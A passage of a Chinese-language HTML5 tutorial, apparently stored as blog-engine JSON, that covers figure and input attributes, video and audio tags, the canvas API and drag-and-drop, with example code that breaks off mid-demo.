URL。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>type</td>\n<td>定义嵌入内容的类型。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels</td>\n<td>设置嵌入内容的宽度。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"figure标签\"><a href=\"#figure标签\" class=\"headerlink\" title=\"figure标签\"></a>figure标签</h3><pre><code>&lt;figure&gt;\n  &lt;p&gt;黄浦江上的的卢浦大桥&lt;/p&gt;\n  &lt;img src=&quot;shanghai_lupu_bridge.jpg&quot; width=&quot;350&quot; height=&quot;234&quot; /&gt;\n&lt;/figure&gt;\n</code></pre><h5 id=\"定义和用法-14\"><a href=\"#定义和用法-14\" class=\"headerlink\" title=\"定义和用法\"></a>定义和用法</h5><p><code>&lt;figure&gt;</code> 标签规定独立的流内容（图像、图表、照片、代码等等）,定义媒介内容的分组，以及它们的标题。其内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。</p>\n<blockquote>\n<p>使用 <code>&lt;figcaption&gt;</code> 元素为 figure 添加标题（caption）。</p>\n</blockquote>\n<h3 id=\"input标签\"><a href=\"#input标签\" class=\"headerlink\" title=\"input标签\"></a>input标签</h3><p>H5新增许多其属性，列表如下</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>accept</td>\n<td>mime_type</td>\n<td>规定通过文件上传来提交的文件的类型。</td>\n</tr>\n<tr>\n<td>align</td>\n<td>left<br>right<br>top<br>middle<br>bottom</td>\n<td>不赞成使用。规定图像输入的对齐方式。</td>\n</tr>\n<tr>\n<td>alt</td>\n<td>text</td>\n<td>定义图像输入的替代文本。</td>\n</tr>\n<tr>\n<td>autocomplete</td>\n<td>on<br>off</td>\n<td>规定是否使用输入字段的自动完成功能。</td>\n</tr>\n<tr>\n<td>autofocus</td>\n<td>autofocus</td>\n<td>规定输入字段在页面加载时是否获得焦点。（不适用于 type=”hidden”）</td>\n</tr>\n<tr>\n<td>checked</td>\n<td>checked</td>\n<td>规定此 input 元素首次加载时应当被选中。</td>\n</tr>\n<tr>\n<td>disabled</td>\n<td>disabled</td>\n<td>当 input 元素加载时禁用此元素。</td>\n</tr>\n<tr>\n<td>form</td>\n<td>formname</td>\n<td>规定输入字段所属的一个或多个表单。</td>\n</tr>\n<tr>\n<td>formaction</td>\n<td>URL</td>\n<td>覆盖表单的 action 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formenctype</td>\n<td>见注释</td>\n<td>覆盖表单的 enctype 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formmethod</td>\n<td>get<br>post</td>\n<td>覆盖表单的 method 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>formnovalidate</td>\n<td>formnovalidate</td>\n<td>覆盖表单的 novalidate 属性。如果使用该属性，则提交表单时不进行验证。</td>\n</tr>\n<tr>\n<td>formtarget</td>\n<td>_blank<br>_self<br>_parent<br>_top<br>framename</td>\n<td>覆盖表单的 target 属性。（适用于 type=”submit” 和 type=”image”）</td>\n</tr>\n<tr>\n<td>height</td>\n<td>pixels<br>%</td>\n<td>定义 input 字段的高度。（适用于 type=”image”）</td>\n</tr>\n<tr>\n<td>list</td>\n<td>datalist-id</td>\n<td>引用包含输入字段的预定义选项的 datalist 。</td>\n</tr>\n<tr>\n<td>max</td>\n<td>number<br>date</td>\n<td>规定输入字段的最大值。请与 “min” 属性配合使用，来创建合法值的范围。</td>\n</tr>\n<tr>\n<td>maxlength</td>\n<td>number</td>\n<td>规定输入字段中的字符的最大长度。</td>\n</tr>\n<tr>\n<td>min</td>\n<td>number<br>date</td>\n<td>规定输入字段的最小值。请与 “max” 属性配合使用，来创建合法值的范围。</td>\n</tr>\n<tr>\n<td>multiple</td>\n<td>multiple</td>\n<td>如果使用该属性，则允许一个以上的值。</td>\n</tr>\n<tr>\n<td>name</td>\n<td>field_name</td>\n<td>定义 input 元素的名称。</td>\n</tr>\n<tr>\n<td>pattern</td>\n<td>regexp_pattern</td>\n<td>规定输入字段的值的模式或格式。例如 pattern=”[0-9]” 表示输入值必须是 0 与 9 之间的数字。</td>\n</tr>\n<tr>\n<td>placeholder</td>\n<td>text</td>\n<td>规定帮助用户填写输入字段的提示。</td>\n</tr>\n<tr>\n<td>readonly</td>\n<td>readonly</td>\n<td>规定输入字段为只读。</td>\n</tr>\n<tr>\n<td>required</td>\n<td>required</td>\n<td>指示输入字段的值是必需的。</td>\n</tr>\n<tr>\n<td>size</td>\n<td>number_of_char</td>\n<td>定义输入字段的宽度。</td>\n</tr>\n<tr>\n<td>src</td>\n<td>URL</td>\n<td>定义以提交按钮形式显示的图像的 URL。</td>\n</tr>\n<tr>\n<td>step</td>\n<td>number</td>\n<td>规定输入字的的合法数字间隔。</td>\n</tr>\n<tr>\n<td>type</td>\n<td>button<br>checkbox<br>file<br>hidden<br>image<br>password<br>radio<br>reset<br>submit<br>text</td>\n<td>规定 input 元素的类型。</td>\n</tr>\n<tr>\n<td>value</td>\n<td>value</td>\n<td>规定 input 元素的值。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels<br>%</td>\n<td>定义 input 字段的宽度。（适用于 type=”image”）</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{"head":{"Name":"<script> var _hmt = _hmt || []; (function() { var hm = document.createElement('script'); hm.src = 'https://hm.baidu.com/hm.js?348e7e9c1ba7a17f316c54cb6795dec7'; var s = document.getElementsByTagName('script')[0];  s.parentNode.insertBefore(hm, s); })(); </script>"}}},"excerpt":"<h3 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h3><ul>\n<li>用于绘画的 canvas 元素</li>\n<li>用于媒介回放的 video 和 audio 元素</li>\n<li>对本地离线存储的更好的支持</li>\n<li>新的特殊内容元素，比如 article、footer、header、nav、section</li>\n<li>新的表单控件，比如 calendar、date、time、email、url、search</li>\n</ul>","more":"<h2 id=\"video标签\"><a href=\"#video标签\" class=\"headerlink\" title=\"video标签\"></a>video标签</h2><pre><code>&lt;video width=&quot;320&quot; height=&quot;240&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot; loop=&quot;loop&quot;&gt;\n      &lt;source src=&quot;movie.ogg&quot; type=&quot;video/ogg&quot;&gt;\n      &lt;source src=&quot;movie.mp4&quot; type=&quot;video/mp4&quot;&gt;\n    Your browser does not support the video tag.\n&lt;/video&gt;\n</code></pre><ul>\n<li>width：定义播放器宽度</li>\n<li>height： 设置视频播放器的高度</li>\n<li>controls：如果出现该属性，则向用户显示控件，播放按钮，音量，进度条，下载按钮等</li>\n<li>autoplay： 如果出现该属性，则视频在就绪后马上播放。</li>\n<li>loop：如果出现该属性，则当媒介文件完成播放后再次开始播放</li>\n<li>preload：如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性</li>\n<li>src：要播放的视频的 URL，也可以像上例中写在source标签里</li>\n</ul>\n<p>video 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。</p>\n<p><code>&lt;video&gt;</code> 与<code>&lt;/video&gt;</code> 之间插入的内容是供不支持 video 元素的浏览器显示的：</p>\n<h4 id=\"支持格式\"><a href=\"#支持格式\" class=\"headerlink\" title=\"支持格式\"></a>支持格式</h4><table>\n<thead>\n<tr>\n<th>格式</th>\n<th>IE</th>\n<th>Firefox</th>\n<th>Opera</th>\n<th>Chrome</th>\n<th>Safari</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Ogg</td>\n<td>No</td>\n<td>3.5+</td>\n<td>10.5+</td>\n<td>5.0+</td>\n<td>No</td>\n</tr>\n<tr>\n<td>MPEG 4</td>\n<td>9.0+</td>\n<td>No</td>\n<td>No</td>\n<td>5.0+</td>\n<td>3.0+</td>\n</tr>\n<tr>\n<td>WebM</td>\n<td>No</td>\n<td>4.0+</td>\n<td>10.6+</td>\n<td>6.0+</td>\n<td>No</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件</li>\n<li>MPEG4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件</li>\n<li>WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件</li>\n</ul>\n<h4 id=\"方法，属性和事件\"><a href=\"#方法，属性和事件\" class=\"headerlink\" title=\"方法，属性和事件\"></a>方法，属性和事件</h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>属性</th>\n<th>事件</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>play()</td>\n<td>currentSrc</td>\n<td>play</td>\n</tr>\n<tr>\n<td>pause()</td>\n<td>currentTime</td>\n<td>pause</td>\n</tr>\n<tr>\n<td>load()</td>\n<td>videoWidth</td>\n<td>progress</td>\n</tr>\n<tr>\n<td>canPlayType</td>\n<td>videoHeight</td>\n<td>error</td>\n</tr>\n<tr>\n<td></td>\n<td>duration</td>\n<td>timeupdate</td>\n</tr>\n<tr>\n<td></td>\n<td>ended</td>\n<td>ended</td>\n</tr>\n<tr>\n<td></td>\n<td>error</td>\n<td>abort</td>\n</tr>\n<tr>\n<td></td>\n<td>paused</td>\n<td>empty</td>\n</tr>\n<tr>\n<td></td>\n<td>muted</td>\n<td>emptied</td>\n</tr>\n<tr>\n<td></td>\n<td>seeking</td>\n<td>waiting</td>\n</tr>\n<tr>\n<td></td>\n<td>volume</td>\n<td>loadedmetadata</td>\n</tr>\n<tr>\n<td></td>\n<td>height</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>width</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>在所有属性中，只有 videoWidth 和 videoHeight 属性是立即可用的。在视频的元数据已加载后，其他属性才可用。</p>\n</blockquote>\n<h2 id=\"audio标签\"><a href=\"#audio标签\" class=\"headerlink\" title=\"audio标签\"></a>audio标签</h2><pre><code>&lt;audio src=&quot;song.ogg&quot; controls=&quot;controls&quot;&gt;\n    Your browser does not support the audio tag.\n&lt;/audio&gt;\n</code></pre><ul>\n<li>autoplay：如果出现该属性，则音频在就绪后马上播放。</li>\n<li>controls：如果出现该属性，则向用户显示控件，比如播放按钮。</li>\n<li>loop：如果出现该属性，则每当音频结束时重新开始播放。</li>\n<li>preload：如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</li>\n<li>src：要播放的音频的 URL。</li>\n</ul>\n<p>audio 元素允许多个 source 元素。source 元素可以链接不同的音频文件。浏览器将使用第一个可识别的格式。</p>\n<p><code>&lt;audio&gt;</code> 与 <code>&lt;/audio&gt;</code> 之间插入的内容是供不支持 audio 元素的浏览器显示的。</p>\n<h4 id=\"支持格式-1\"><a href=\"#支持格式-1\" class=\"headerlink\" title=\"支持格式\"></a>支持格式</h4><table>\n<thead>\n<tr>\n<th>格式</th>\n<th>IE9</th>\n<th>Firefox3.5</th>\n<th>Opera10.5</th>\n<th>Chrome3.0</th>\n<th>Safari3.0</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Ogg Vorbis</td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n<td>YES</td>\n<td></td>\n</tr>\n<tr>\n<td>MP3</td>\n<td>YES</td>\n<td></td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n</tr>\n<tr>\n<td>Wav</td>\n<td></td>\n<td>YES</td>\n<td>YES</td>\n<td></td>\n<td>YES</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"canvas\"><a href=\"#canvas\" class=\"headerlink\" title=\"canvas\"></a>canvas</h2><pre><code>&lt;canvas id=&quot;myCanvas&quot;&gt;&lt;/canvas&gt;\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    var canvas=document.getElementById(&apos;myCanvas&apos;);\n    var ctx=canvas.getContext(&apos;2d&apos;);\n    ctx.fillStyle=&apos;#FF0000&apos;;\n    ctx.fillRect(0,0,80,100);\n&lt;/script&gt;\n</code></pre><h5 id=\"浏览器支持\"><a href=\"#浏览器支持\" class=\"headerlink\" title=\"浏览器支持\"></a>浏览器支持</h5><p>Internet Explorer 8 以及更早的版本不支持 <code>&lt;canvas&gt;</code>标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>\n<h5 id=\"标签定义和用法\"><a href=\"#标签定义和用法\" class=\"headerlink\" title=\"标签定义和用法\"></a>标签定义和用法</h5><p><code>&lt;canvas&gt;</code> 标签定义图形，比如图表和其他图像。但是它只提供图形容器，必须使用javascript来绘制图形。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>height</td>\n<td>pixels</td>\n<td>设置 canvas 的高度。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>pixels</td>\n<td>设置 canvas 的宽度。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"使用javascript绘制\"><a href=\"#使用javascript绘制\" class=\"headerlink\" title=\"使用javascript绘制\"></a>使用javascript绘制</h4><p><a href=\"http://www.w3school.com.cn/tags/html_ref_canvas.asp\">W3School参考链接</a></p>\n<h5 id=\"颜色、样式和阴影\"><a href=\"#颜色、样式和阴影\" class=\"headerlink\" title=\"颜色、样式和阴影\"></a>颜色、样式和阴影</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fillStyle</td>\n<td>设置或返回用于填充绘画的颜色、渐变或模式</td>\n</tr>\n<tr>\n<td>strokeStyle</td>\n<td>设置或返回用于笔触的颜色、渐变或模式</td>\n</tr>\n<tr>\n<td>shadowColor</td>\n<td>设置或返回用于阴影的颜色</td>\n</tr>\n<tr>\n<td>shadowBlur</td>\n<td>设置或返回用于阴影的模糊级别</td>\n</tr>\n<tr>\n<td>shadowOffsetX</td>\n<td>设置或返回阴影距形状的水平距离</td>\n</tr>\n<tr>\n<td>shadowOffsetY</td>\n<td>设置或返回阴影距形状的垂直距离</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>createLinearGradient()</td>\n<td>创建线性渐变（用在画布内容上）</td>\n</tr>\n<tr>\n<td>createPattern()</td>\n<td>在指定的方向上重复指定的元素</td>\n</tr>\n<tr>\n<td>createRadialGradient()</td>\n<td>创建放射状/环形的渐变（用在画布内容上）</td>\n</tr>\n<tr>\n<td>addColorStop()</td>\n<td>规定渐变对象中的颜色和停止位置</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"线条样式\"><a href=\"#线条样式\" class=\"headerlink\" title=\"线条样式\"></a>线条样式</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lineCap</td>\n<td>设置或返回线条的结束端点样式</td>\n</tr>\n<tr>\n<td>lineJoin</td>\n<td>设置或返回两条线相交时，所创建的拐角类型</td>\n</tr>\n<tr>\n<td>lineWidth</td>\n<td>设置或返回当前的线条宽度</td>\n</tr>\n<tr>\n<td>miterLimit</td>\n<td>设置或返回最大斜接长度</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"矩形\"><a href=\"#矩形\" class=\"headerlink\" title=\"矩形\"></a>矩形</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>rect()</td>\n<td>创建矩形</td>\n</tr>\n<tr>\n<td>fillRect()</td>\n<td>绘制“被填充”的矩形</td>\n</tr>\n<tr>\n<td>strokeRect()</td>\n<td>绘制矩形（无填充）</td>\n</tr>\n<tr>\n<td>clearRect()</td>\n<td>在给定的矩形内清除指定的像素</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"路径\"><a href=\"#路径\" class=\"headerlink\" title=\"路径\"></a>路径</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fill()</td>\n<td>填充当前绘图（路径）</td>\n</tr>\n<tr>\n<td>stroke()</td>\n<td>绘制已定义的路径</td>\n</tr>\n<tr>\n<td>beginPath()</td>\n<td>起始一条路径，或重置当前路径</td>\n</tr>\n<tr>\n<td>moveTo()</td>\n<td>把路径移动到画布中的指定点，不创建线条</td>\n</tr>\n<tr>\n<td>closePath()</td>\n<td>创建从当前点回到起始点的路径</td>\n</tr>\n<tr>\n<td>lineTo()</td>\n<td>添加一个新点，然后在画布中创建从该点到最后指定点的线条</td>\n</tr>\n<tr>\n<td>clip()</td>\n<td>从原始画布剪切任意形状和尺寸的区域</td>\n</tr>\n<tr>\n<td>quadraticCurveTo()</td>\n<td>创建二次贝塞尔曲线</td>\n</tr>\n<tr>\n<td>bezierCurveTo()</td>\n<td>创建三次方贝塞尔曲线</td>\n</tr>\n<tr>\n<td>arc()</td>\n<td>创建弧/曲线（用于创建圆形或部分圆）</td>\n</tr>\n<tr>\n<td>arcTo()</td>\n<td>创建两切线之间的弧/曲线</td>\n</tr>\n<tr>\n<td>isPointInPath()</td>\n<td>如果指定的点位于当前路径中，则返回 true，否则返回 false</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"转换\"><a href=\"#转换\" class=\"headerlink\" title=\"转换\"></a>转换</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>scale()</td>\n<td>缩放当前绘图至更大或更小</td>\n</tr>\n<tr>\n<td>rotate()</td>\n<td>旋转当前绘图</td>\n</tr>\n<tr>\n<td>translate()</td>\n<td>重新映射画布上的 (0,0) 位置</td>\n</tr>\n<tr>\n<td>transform()</td>\n<td>替换绘图的当前转换矩阵</td>\n</tr>\n<tr>\n<td>setTransform()</td>\n<td>将当前转换重置为单位矩阵。然后运行 transform()</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"文本\"><a href=\"#文本\" class=\"headerlink\" title=\"文本\"></a>文本</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>font</td>\n<td>设置或返回文本内容的当前字体属性</td>\n</tr>\n<tr>\n<td>textAlign</td>\n<td>设置或返回文本内容的当前对齐方式</td>\n</tr>\n<tr>\n<td>textBaseline</td>\n<td>设置或返回在绘制文本时使用的当前文本基线</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>fillText()</td>\n<td>在画布上绘制“被填充的”文本</td>\n</tr>\n<tr>\n<td>strokeText()</td>\n<td>在画布上绘制文本（无填充）</td>\n</tr>\n<tr>\n<td>measureText()</td>\n<td>返回包含指定文本宽度的对象</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"图像绘制\"><a href=\"#图像绘制\" class=\"headerlink\" title=\"图像绘制\"></a>图像绘制</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>drawImage()</td>\n<td>向画布上绘制图像、画布或视频</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"像素操作\"><a href=\"#像素操作\" class=\"headerlink\" title=\"像素操作\"></a>像素操作</h5><table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>width</td>\n<td>返回 ImageData 对象的宽度</td>\n</tr>\n<tr>\n<td>height</td>\n<td>返回 ImageData 对象的高度</td>\n</tr>\n<tr>\n<td>data</td>\n<td>返回一个对象，其包含指定的 ImageData 对象的图像数据</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>createImageData()</td>\n<td>创建新的、空白的 ImageData 对象</td>\n</tr>\n<tr>\n<td>getImageData()</td>\n<td>返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据</td>\n</tr>\n<tr>\n<td>putImageData()</td>\n<td>把图像数据（从指定的 ImageData 对象）放回画布上</td>\n</tr>\n</tbody>\n</table>\n<p>#####　合成</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>globalAlpha</td>\n<td>设置或返回绘图的当前 alpha 或透明值</td>\n</tr>\n<tr>\n<td>globalCompositeOperation</td>\n<td>设置或返回新图像如何绘制到已有的图像上</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h5><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>save()</td>\n<td>保存当前环境的状态</td>\n</tr>\n<tr>\n<td>restore()</td>\n<td>返回之前保存过的路径状态和属性</td>\n</tr>\n<tr>\n<td>createEvent()</td>\n<td></td>\n</tr>\n<tr>\n<td>getContext()</td>\n<td></td>\n</tr>\n<tr>\n<td>toDataURL()</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p><strong><code>&lt;canvas&gt;</code> 标记和 SVG 以及 VML 之间的差异</strong><br><code>&lt;canvas&gt;</code>有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。<br>这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。<br>要从同一图形的一个 <code>&lt;canvas&gt;</code> 标记中移除元素，往往需要擦掉绘图重新绘制它。</p>\n</blockquote>\n<h2 id=\"拖放\"><a href=\"#拖放\" class=\"headerlink\" title=\"拖放\"></a>拖放</h2><pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;style type=&quot;text/css&quot;&gt;\n    #div1, #div2, #div3, #div4{\n        float:left; \n        width:100px;\n        height:100px;\n        margin:10px;\n        padding:10px;\n        border:1px solid #aaaaaa;\n    }\n    *{\n        transition:all 0.5s;\n    }\n    #dragDiv{\n        background-color: #369;\n        width:100px;\n        height:100px;\n    }\n    #mouseLocation{\n        clear: both;\n        width: 265px;\n        margin-left: 10px;\n        text-align: center;\n    }\n    #crossDiv{\n        clear: both;\n        display: inline-block;\n        height: 200px;\n        width: 10px;\n        background-color: #333;\n    }\n    #dragElement{\n        float: left;\n        width: 120px;\n        height: 120px;\n        background-color: #369;\n        margin-left: -99999px;\n        opacity: 1;\n    }\n    #dragElement:click{\n        width: 150px;\n        height: 150px;\n    }\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div id=&quot;div1&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;\n    &lt;div id=&quot;dragDiv&quot; draggable=&quot;true&quot; ondragstart=&quot;drag(event)&quot; ondrag=&quot;draging(event)&quot; &gt;&lt;/div&gt;\n&lt;/div&gt;\n&lt;div id=&quot;div2&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;mouseLocation&quot;&gt;X坐标：0，Y坐标：0&lt;/div&gt;\n&lt;div id=&quot;dragElement&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;div3&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;\n&lt;div id=&quot;div4&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;\n\n&lt;script type=&quot;text/javascript&quot;&gt;\n    var mouseLocation = document.getElementById(&quot;mouseLocation&quot;);\n    var dragElement = document.getElementById(&quot;dragElement&quot;);\n\n    function draging(ev) {\n        mouseLocation.innerHTML = &quot;X坐标：&quot; + ev.clientX + &quot;，Y坐标：&quot; + ev.clientY;\n    }\n\n    function allowDrop(ev){\n        ev.preventDefault();\n        mouseLocation.style.backgroundColor = &quot;#333&quot;;\n        mouseLocation.style.color = &quot;#fff&quot;;\n        ev.dataTransfer.dropEffect = &quot;copy&quot;;\n    }\n\n    function dragLeave(ev) {\n        mouseLocation.style.backgroundColor = &quot;#fff&quot;;\n        mouseLocation.style.color = &quot;#000&quot;;\n    }\n\n    function drag(ev){\n        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);\n        ev.dataTransfer.setDragImage(dragElement, 60, 60);\n        ev.dataTransfer.effectAllowed = &quot;copy&quot;;\n    }\n\n    function drop(ev) {\n        ev.preventDefault();\n        var data = ev.dataTransfer.getData(&quot;Text&quot;);\n        ev.target.appendChild(document.getElementById(data));\n    }\n&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>整个过程可解析为如下过程：</p>\n<ol>\n<li><p><strong>设置元素为可拖放</strong>——draggable 属性</p>\n<pre><code>`&lt;img draggable=&quot;true&quot; /&gt;`\n</code></pre></li>\n<li><p><strong>拖动什么</strong> ——ondragstart 和 setData()<br><br>在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。dataTransfer.setData() 方法设置被拖数据的数据类型和值。</p>\n</li>\n</ol>\n<blockquote>\n<p><a href=\"http://www.tuicool.com/articles/j6Zbam\">参考链接</a></p>\n</blockquote>\n<pre><code>    function drag(ev) {\n        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);\n    }\n\n在这个例子中，数据类型是 &quot;Text&quot;，值是可拖动元素的 id (&quot;drag1&quot;)。\n</code></pre><ol>\n<li><p><strong>拖动过程中</strong>——ondrag<br><br>拖动过程中，在被拖拉的节点上持续触发。</p>\n</li>\n<li><p><strong>放到何处</strong> ——ondragover和getData()<br><br>ondragover 事件规定在何处放置被拖动的数据。<br>默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。<br>这要通过调用 ondragover 事件的 event.preventDefault() 方法。</p>\n<pre><code>event.preventDefault()\n</code></pre></li>\n<li><p><strong>进行放置</strong> ——ondrop<br><br>当放置被拖数据时，会发生 drop 事件。在上面的例子中，ondrop 属性调用了一个函数，drop(event)。</p>\n<pre><code>function drop(ev) {\n    ev.preventDefault();\n    var data=ev.dataTransfer.getData(&quot;Text&quot;);\n    ev.target.appendChild(document.getElementById(data));\n}\n</code></pre></li>\n</ol>\n<blockquote>\n<p>代码解释：</p>\n<ul>\n<li>调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）</li>\n<li>通过 dataTransfer.getData(“Text”) 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。</li>\n<li>被拖数据是被拖元素的 id (“drag1”)</li>\n<li>把被拖元素追加到放置元素（目标元素）中</li>\n</ul>\n</blockquote>\n<p>其他事件和方法：</p>\n<ul>\n<li><strong>dragend事件</strong>：<br>拖拉结束时（释放鼠标键或按下escape键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragStart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。</li>\n<li><strong>dragenter事件</strong>：拖拉进入当前节点时，在当前节点上触发，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</li>\n<li><strong>dragover事件</strong>：拖拉到当前节点上方时，在当前节点上持续触发，该事件的target属性是当前节点。该事件与dragenter事件基本类似，默认会重置当前的拖拉事件的效果（DataTransfer对象的dropEffect属性）为none，即不允许放下被拖拉的节点，所以如果允许在当前节点drop数据，通常会使用preventDefault方法，取消重置拖拉效果为none。</li>\n<li><strong>event.dataTransfer.setDragImage(element,x,y)方法</strong>：设置拖放操作的自定义图标。其中element设置自定义图标，x设置图标与鼠标在水平方向上的距离，y设置图标与鼠标在垂直方向上的距离。</li>\n</ul>\n<p>####H5拖拽常用功能</p>\n<blockquote>\n<p>HTML5文件拖拽预览Demo</p>\n</blockquote>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n &lt;head&gt; \n  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; \n  &lt;title&gt;HTML5文件拖拽预览Demo&lt;/title&gt; \n  &lt;style type=&quot;text/css&quot;&gt;\n      h1 {\n        padding: 0px;\n        margin: 0px;\n    }\n    div#show {\n        border: 1px solid #ccc;\n        width: 400px;\n        height: 300px;\n        display: -moz-box;\n        display: -webkit-box;\n        -moz-box-align: center;\n        -webkit-box-align: center;\n        -moz-box-pack: center;\n        -webkit-box-pack: center;\n        resize: both;\n        overflow: auto;\n    }\n    div[id^=show]:hover {\n        border: 1px solid #333;\n    }\n    div#main {\n        width: 100%;\n    }\n    div#successLabel {\n        color: Red;\n    }\n    div#content {\n        display: none;\n    }    \n&lt;/style&gt; \n  &lt;script type=&quot;text/javascript&quot;&gt;\n      function init() {\n        var dest = document.getElementById(&quot;show&quot;);\n        dest.addEventListener(&quot;dragover&quot;,\n            function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n            },\n        false);\n        dest.addEventListener(&quot;dragend&quot;,\n            function(ev) {\n                ev.stopPropagation();\n                ev.preventDefault();\n            },\n        false);\n        dest.addEventListener(&quot;drop&quot;,\n            